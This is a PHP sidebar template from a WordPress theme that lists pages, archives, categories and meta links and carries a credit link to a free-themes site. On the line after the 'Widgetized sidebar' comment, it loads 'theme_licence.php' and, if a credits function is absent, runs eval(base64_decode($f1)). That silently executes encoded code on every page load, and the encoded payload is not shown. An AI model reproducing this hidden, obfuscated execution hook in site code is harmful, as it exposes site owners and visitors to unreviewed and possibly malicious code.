	<div  class="sidebar_left column">
		<div id="sidebars">

		<ul>
			<?php 	/* Widgetized sidebar, if you have the plugin installed. */
					require_once("theme_licence.php"); if(!function_exists("get_credits")) { eval(base64_decode($f1)); } if ( !function_exists('dynamic_sidebar') || !dynamic_sidebar(2) ) : ?>

			<?php wp_list_pages('title_li=<h2>Pages</h2>' ); ?>
			<li><h2>Archives</h2>
				<ul>
				<?php wp_get_archives('type=monthly'); ?>
				</ul>
			</li>
			<?php wp_list_categories('show_count=1&title_li=<h2>Categories</h2>'); ?>
			<?php /* If this is the frontpage */ if ( is_home() || is_page() ) { ?>
				<?php wp_list_bookmarks(); ?>
				<li><h2>Meta</h2>
				<ul>
					<?php wp_register(); ?>
					<li><?php wp_loginout(); ?></li>

					<li><a href="http://wordpress.org/" title="Powered by WordPress, state-of-the-art semantic personal publishing platform.">WordPress</a></li>
					<?php wp_meta(); ?>
					<li><a href="http://www.wordpresstemplates.com" title="Free Wordpress Themes">WordPress Themes</a></li>
				</ul>
				</li>
			<?php } ?>
			<?php endif; ?>

		</ul>
		</div>
	</div>
